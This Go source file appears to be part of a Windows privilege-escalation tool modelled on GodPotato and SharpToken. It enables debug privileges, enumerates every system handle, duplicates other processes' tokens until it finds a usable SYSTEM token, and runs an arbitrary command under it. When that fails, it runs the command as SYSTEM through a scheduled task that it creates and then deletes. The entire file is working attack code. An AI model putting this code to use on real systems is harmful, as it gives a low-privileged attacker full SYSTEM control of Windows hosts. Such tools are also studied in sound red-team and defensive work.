package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	tokenUser              = 1
	tokenTypeInfo          = 8
	tokenImpersonationInfo = 9
	tokenSessionID         = 12
	tokenIntegrityLevel    = 25

	tokenIsPrimary = 1

	seDebugPrivilege = 20
)

// SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX (SystemExtendedHandleInformation)
type systemHandleEntry struct {
	Object                uintptr
	UniqueProcessID       uintptr
	HandleValue           uintptr
	GrantedAccess         uint32
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint16
	HandleAttributes      uint32
	Reserved              uint32
}

func tokenInfo(token windows.Handle, class uint32) ([]byte, bool) {
	// First call with a NULL buffer is expected to fail with
	// ERROR_INSUFFICIENT_BUFFER; it only tells us the required size.
	var size uint32
	procGetTokenInformation.Call(uintptr(token), uintptr(class), 0, 0,
		uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		return nil, false
	}
	buf := make([]byte, size)
	r, _, _ := procGetTokenInformation.Call(uintptr(token), uintptr(class),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(size),
		uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return nil, false
	}
	return buf[:size], true
}

func tokenSID(token windows.Handle) (string, bool) {
	buf, ok := tokenInfo(token, tokenUser)
	if !ok || uintptr(len(buf)) < uintptrSize {
		return "", false
	}
	sid := readPtr(uintptr(unsafe.Pointer(&buf[0])))

	var str *uint16
	r, _, _ := procConvertSidToStringSidW.Call(sid, uintptr(unsafe.Pointer(&str)))
	if r == 0 || str == nil {
		return "", false
	}
	result := windows.UTF16PtrToString(str)
	procLocalFree.Call(uintptr(unsafe.Pointer(str)))
	return result, true
}

func tokenIsSystem(token windows.Handle) bool {
	sid, ok := tokenSID(token)
	return ok && sid == "S-1-5-18"
}

func tokenUserName(token windows.Handle) (string, bool) {
	buf, ok := tokenInfo(token, tokenUser)
	if !ok || uintptr(len(buf)) < uintptrSize {
		return "", false
	}
	sid := readPtr(uintptr(unsafe.Pointer(&buf[0])))

	var account [256]uint16
	var domain [256]uint16
	accountLen := uint32(len(account))
	domainLen := uint32(len(domain))
	var use uint32
	r, _, _ := procLookupAccountSidW.Call(0, sid,
		uintptr(unsafe.Pointer(&account[0])), uintptr(unsafe.Pointer(&accountLen)),
		uintptr(unsafe.Pointer(&domain[0])), uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&use)))
	if r == 0 {
		return "", false
	}
	name := windows.UTF16ToString(domain[:domainLen])
	user := windows.UTF16ToString(account[:accountLen])
	if name != "" {
		name += `\`
	}
	return name + user, true
}

func tokenIntegrity(token windows.Handle) (uint32, bool) {
	buf, ok := tokenInfo(token, tokenIntegrityLevel)
	if !ok || uintptr(len(buf)) < uintptrSize {
		return 0, false
	}
	sid := readPtr(uintptr(unsafe.Pointer(&buf[0])))
	count := readByte(sid + 1)
	if count == 0 {
		return 0, false
	}
	return readU32(sid + 8 + uintptr(count-1)*4), true
}

func tokenImpersonationLevel(token windows.Handle) (uint32, bool) {
	buf, ok := tokenInfo(token, tokenImpersonationInfo)
	if !ok || len(buf) < 4 {
		return 0, false
	}
	return readU32(uintptr(unsafe.Pointer(&buf[0]))), true
}

func tokenIsPrimaryToken(token windows.Handle) bool {
	buf, ok := tokenInfo(token, tokenTypeInfo)
	if !ok || len(buf) < 4 {
		return false
	}
	return readU32(uintptr(unsafe.Pointer(&buf[0]))) == tokenIsPrimary
}

func usableSystemToken(token windows.Handle) bool {
	if !tokenIsSystem(token) {
		return false
	}
	if integrity, ok := tokenIntegrity(token); !ok || integrity < systemIntegrity {
		return false
	}
	if !tokenIsPrimaryToken(token) {
		level, ok := tokenImpersonationLevel(token)
		if !ok || level < securityImpersonation {
			return false
		}
	}
	restricted, _, _ := procIsTokenRestricted.Call(uintptr(token))
	return restricted == 0
}

func duplicateTokenAsPrimary(token windows.Handle) windows.Handle {
	var primary uintptr
	r, _, _ := procDuplicateTokenEx.Call(uintptr(token), uintptr(tokenAccessAll), 0,
		uintptr(securityImpersonation), tokenPrimaryType, uintptr(unsafe.Pointer(&primary)))
	if r == 0 || primary == 0 {
		return 0
	}
	return windows.Handle(primary)
}

func duplicateSystemTokenAsPrimary(token windows.Handle) windows.Handle {
	if !usableSystemToken(token) {
		return 0
	}
	return duplicateTokenAsPrimary(token)
}

func promoteIfSystem(token uintptr) uintptr {
	if !usableSystemToken(windows.Handle(token)) {
		return 0
	}
	return uintptr(duplicateTokenAsPrimary(windows.Handle(token)))
}

func enablePrivilege(token uintptr, id uint32) {
	privileges := tokenPrivileges{PrivilegeCount: 1}
	privileges.Luid.LowPart = id
	privileges.Attributes = 2 // SE_PRIVILEGE_ENABLED
	procAdjustTokenPrivileges.Call(token, 0, uintptr(unsafe.Pointer(&privileges)),
		unsafe.Sizeof(privileges), 0, 0)
}

func enableStandardPrivileges(token uintptr) {
	// Numeric LUIDs: LookupPrivilegeValue can fail while impersonating.
	enablePrivilege(token, 3) // SeAssignPrimaryTokenPrivilege
	enablePrivilege(token, 5) // SeIncreaseQuotaPrivilege
	enablePrivilege(token, 7) // SeTcbPrivilege
	enablePrivilege(token, seDebugPrivilege)
	enablePrivilege(token, 29) // SeImpersonatePrivilege
}

func enableDebugPrivilege(hint windows.Handle) {
	token := uintptr(hint)
	own := false

	if token == 0 {
		thread, _, _ := procGetCurrentThread.Call()
		var threadToken uintptr
		if r, _, _ := procOpenThreadToken.Call(thread, uintptr(tokenAdjustPrivileges|tokenQuery), 1,
			uintptr(unsafe.Pointer(&threadToken))); r != 0 {
			token = threadToken
			own = true
		} else {
			proc, _, _ := procGetCurrentProcess.Call()
			var processToken uintptr
			if r, _, _ := procOpenProcessToken.Call(proc, uintptr(tokenAdjustPrivileges|tokenQuery),
				uintptr(unsafe.Pointer(&processToken))); r == 0 {
				return
			}
			token = processToken
			own = true
		}
	}
	if own {
		defer closeHandle(token)
	}
	enablePrivilege(token, seDebugPrivilege)
}

func listSystemHandles() []systemHandleEntry {
	size := uintptr(1 << 20)
	for {
		buf := make([]byte, size)
		var returned uint32
		status, _, _ := procNtQuerySystemInformation.Call(
			uintptr(systemExtendedHandleInformation),
			uintptr(unsafe.Pointer(&buf[0])),
			size,
			uintptr(unsafe.Pointer(&returned)))
		st := uint32(status)
		if (st == statusInfoLengthMismatch || st == statusBufferOverflow) && size < (256<<20) {
			size *= 2
			continue
		}
		if int32(st) < 0 {
			logInfo("[!] NtQuerySystemInformation failed: 0x%x", st)
			return nil
		}

		count := readPtr(uintptr(unsafe.Pointer(&buf[0])))
		const entrySize = 40
		max := uintptr((len(buf) - 16) / entrySize)
		if count > max {
			count = max
		}
		entries := make([]systemHandleEntry, int(count))
		if count > 0 {
			base := unsafe.Pointer(&buf[16])
			for i := 0; i < int(count); i++ {
				entries[i] = *(*systemHandleEntry)(unsafe.Add(base, uintptr(i)*entrySize))
			}
		}
		return entries
	}
}

// tokenObjectTypeIndex discovers which handle-table ObjectTypeIndex denotes a
// Token object, by locating a token handle owned by this process.
func tokenObjectTypeIndex(hint windows.Handle, entries []systemHandleEntry) int {
	token := uintptr(hint)
	own := false
	if token == 0 {
		proc, _, _ := procGetCurrentProcess.Call()
		var processToken uintptr
		if r, _, _ := procOpenProcessToken.Call(proc, tokenQuery,
			uintptr(unsafe.Pointer(&processToken))); r == 0 {
			return -1
		}
		token = processToken
		own = true
	}
	if own {
		defer closeHandle(token)
	}

	pid, _, _ := procGetCurrentProcessId.Call()
	for _, entry := range entries {
		if entry.UniqueProcessID == pid && entry.HandleValue == token {
			return int(entry.ObjectTypeIndex)
		}
	}
	return -1
}

// findSystemToken walks every process token (SharpToken's ListProcessTokens
// approach) and returns a duplicated primary SYSTEM token.
func findSystemToken(hint windows.Handle) windows.Handle {
	enableDebugPrivilege(hint)

	entries := listSystemHandles()
	if len(entries) == 0 {
		return 0
	}
	tokenType := tokenObjectTypeIndex(hint, entries)
	if tokenType < 0 {
		logInfo("[!] Could not determine token object type index, using handle scan only")
	}

	self, _, _ := procGetCurrentProcess.Call()
	processes := map[uint32]uintptr{}
	primaryTried := map[uint32]bool{}
	var found windows.Handle

	logFound := func(token windows.Handle, pid uint32, how string) {
		if name, ok := tokenUserName(token); ok {
			logInfo("[+] PID %d token %s (%s)", pid, how, name)
		}
	}

	for _, entry := range entries {
		pid := uint32(entry.UniqueProcessID)
		if pid == 0 || pid == 4 {
			continue
		}

		process, cached := processes[pid]
		if !cached {
			process, _, _ = procOpenProcess.Call(
				uintptr(processDuplicateHandle|processQueryLimitedInformation), 0, uintptr(pid))
			processes[pid] = process
		}
		if process == 0 {
			primaryTried[pid] = true
			continue
		}

		if !primaryTried[pid] {
			primaryTried[pid] = true
			var processToken uintptr
			if r, _, _ := procOpenProcessToken.Call(process, uintptr(tokenAccessAll),
				uintptr(unsafe.Pointer(&processToken))); r != 0 {
				if primary := promoteIfSystem(processToken); primary != 0 {
					closeHandle(processToken)
					found = windows.Handle(primary)
					logFound(found, pid, "duplicated")
					break
				}
				closeHandle(processToken)
			}
		}

		if tokenType < 0 || int(entry.ObjectTypeIndex) != tokenType {
			continue
		}
		// This access mask is known to stall handle duplication.
		if entry.GrantedAccess == 0x0012019f {
			continue
		}

		var duplicate uintptr
		if r, _, _ := procDuplicateHandle.Call(process, entry.HandleValue, self,
			uintptr(unsafe.Pointer(&duplicate)), uintptr(tokenAccessAll), 0, 0); r == 0 {
			continue
		}
		primary := promoteIfSystem(duplicate)
		closeHandle(duplicate)
		if primary != 0 {
			found = windows.Handle(primary)
			logFound(found, pid, "handle duplicated")
			break
		}
	}

	for _, process := range processes {
		closeHandle(process)
	}
	return found
}

// createProcessReadOut starts cmdLine under the stolen token and streams the
// child's stdout/stderr to our stdout.
func createProcessReadOut(token windows.Handle, cmdLine string) {
	// Impersonation + CreateProcessAsUser must run on the same OS thread.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	primary := token
	ownPrimary := false
	if !tokenIsPrimaryToken(token) {
		if primary = duplicateTokenAsPrimary(token); primary == 0 {
			logInfo("[!] Cannot obtain a primary token")
			return
		}
		ownPrimary = true
	}
	if ownPrimary {
		defer closeHandle(uintptr(primary))
	}

	// Move the token into our session (best effort).
	pid, _, _ := procGetCurrentProcessId.Call()
	var session uint32
	if r, _, _ := procProcessIdToSessionId.Call(pid, uintptr(unsafe.Pointer(&session))); r != 0 {
		procSetTokenInformation.Call(uintptr(primary), tokenSessionID,
			uintptr(unsafe.Pointer(&session)), 4)
	}

	if r, _, _ := procImpersonateLoggedOnUser.Call(uintptr(primary)); r != 0 {
		defer procRevertToSelf.Call()

		thread, _, _ := procGetCurrentThread.Call()
		var threadToken uintptr
		if r, _, _ := procOpenThreadToken.Call(thread,
			uintptr(tokenAdjustPrivileges|tokenQuery), 1,
			uintptr(unsafe.Pointer(&threadToken))); r != 0 {
			enableStandardPrivileges(threadToken)
			closeHandle(threadToken)
		}
	} else {
		enableStandardPrivileges(uintptr(primary))
	}

	sa := securityAttributes{
		Length:        uint32(unsafe.Sizeof(securityAttributes{})),
		InheritHandle: 1,
	}
	var readPipe, writePipe uintptr
	if r, _, _ := procCreatePipe.Call(uintptr(unsafe.Pointer(&readPipe)),
		uintptr(unsafe.Pointer(&writePipe)), uintptr(unsafe.Pointer(&sa)), 0); r == 0 {
		logInfo("[!] CreatePipe failed")
		return
	}
	defer closeHandle(readPipe)
	procSetHandleInformation.Call(readPipe, uintptr(handleFlagInherit), 0)

	si := windows.StartupInfo{
		Cb:        uint32(unsafe.Sizeof(windows.StartupInfo{})),
		Flags:     startfUseStdHandles,
		StdOutput: windows.Handle(writePipe),
		StdErr:    windows.Handle(writePipe),
	}
	cmdPtr := utf16Ptr(cmdLine)
	if cmdPtr == nil {
		closeHandle(writePipe)
		return
	}

	var pi windows.ProcessInformation
	flags := uintptr(createNoWindow | createUnicodeEnvironment)
	created, _, createErr := procCreateProcessAsUserW.Call(
		uintptr(primary), 0, uintptr(unsafe.Pointer(cmdPtr)),
		0, 0, 1, flags, 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if created == 0 {
		created, _, createErr = procCreateProcessWithTokenW.Call(
			uintptr(primary), 0, 0, uintptr(unsafe.Pointer(cmdPtr)),
			flags, 0, 0,
			uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	}
	runtime.KeepAlive(cmdPtr)

	// Close our copy of the write end so the read end sees EOF when the child exits.
	closeHandle(writePipe)

	totalBytes := 0
	var exitCode uint32
	if created != 0 {
		logInfo("[*] process start with pid %d", pi.ProcessId)
		buf := make([]byte, 4096)
		for {
			var n uint32
			r, _, _ := procReadFile.Call(readPipe, uintptr(unsafe.Pointer(&buf[0])),
				uintptr(len(buf)), uintptr(unsafe.Pointer(&n)), 0)
			if r == 0 || n == 0 {
				break
			}
			os.Stdout.Write(buf[:n])
			totalBytes += int(n)
		}
		procWaitForSingleObject.Call(uintptr(pi.Process), 60000)
		procGetExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode)))
		logInfo("[*] process exit code 0x%x", exitCode)
		closeHandle(uintptr(pi.Process))
		closeHandle(uintptr(pi.Thread))
	} else {
		logInfo("[!] Cannot create process Win32Error:%v", createErr)
	}

	childInitFailure := created != 0 && totalBytes == 0 &&
		(exitCode == 0xC0000142 || exitCode == 0xC0000135 ||
			exitCode == 0xC0000139 || exitCode == 0xC000007B)

	if created == 0 || childInitFailure {
		if tokenIsSystem(token) {
			logInfo("[*] Falling back to Task Scheduler (SYSTEM)")
			runAsSystemViaTask(cmdLine)
		} else if created == 0 {
			logInfo("[!] Token is not SYSTEM, cannot use the Task Scheduler fallback")
		}
	}
}

func wideToACP(s string) []byte {
	src := utf16Ptr(s)
	if src == nil {
		return []byte(s)
	}
	size, _, _ := procWideCharToMultiByte.Call(0, 0,
		uintptr(unsafe.Pointer(src)), ^uintptr(0),
		0, 0, 0, 0)
	if size == 0 {
		return []byte(s)
	}
	out := make([]byte, size)
	procWideCharToMultiByte.Call(0, 0,
		uintptr(unsafe.Pointer(src)), ^uintptr(0),
		uintptr(unsafe.Pointer(&out[0])), size, 0, 0)
	return out
}

func tempDirNoSpaces() string {
	buf := make([]uint16, 260)
	n, _, _ := procGetTempPathW.Call(uintptr(len(buf)), uintptr(unsafe.Pointer(&buf[0])))
	dir := windows.UTF16ToString(buf[:n])
	if dir == "" || strings.Contains(dir, " ") {
		dir = `C:\Windows\Temp\`
	}
	if !strings.HasSuffix(dir, `\`) {
		dir += `\`
	}
	return dir
}

// runAsSystemViaTask is the last-resort fallback: let the Task Scheduler
// service (SYSTEM) run the command when this account cannot create a process
// with the stolen token.
func runAsSystemViaTask(cmdLine string) bool {
	tick, _, _ := procGetTickCount64.Call()
	name := fmt.Sprintf("gp_%d_%d", os.Getpid(), uint64(tick)%1000000000)
	dir := tempDirNoSpaces()
	batPath := dir + name + ".bat"
	outPath := dir + name + ".txt"
	taskName := "GodPotato_" + name

	content := "@echo off\r\n" + cmdLine + ` > "` + outPath + `" 2>&1` + "\r\n"
	if err := os.WriteFile(batPath, wideToACP(content), 0o644); err != nil {
		logInfo("[!] Cannot write task script: %v", err)
		return false
	}
	defer os.Remove(batPath)
	defer os.Remove(outPath)

	run := func(args ...string) {
		cmd := exec.Command("schtasks.exe", args...)
		_ = cmd.Run()
	}

	run("/create", "/tn", taskName, "/tr", "cmd /d /c "+batPath,
		"/sc", "once", "/st", "00:00", "/ru", "SYSTEM", "/f")
	run("/run", "/tn", taskName)

	var data []byte
	for i := 0; i < 40; i++ {
		if info, err := os.Stat(outPath); err == nil && info.Size() > 0 {
			data, _ = os.ReadFile(outPath)
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	if len(data) > 0 {
		os.Stdout.Write(data)
	} else {
		logInfo("[!] Task output was empty")
	}

	run("/delete", "/tn", taskName, "/f")
	return len(data) > 0
}
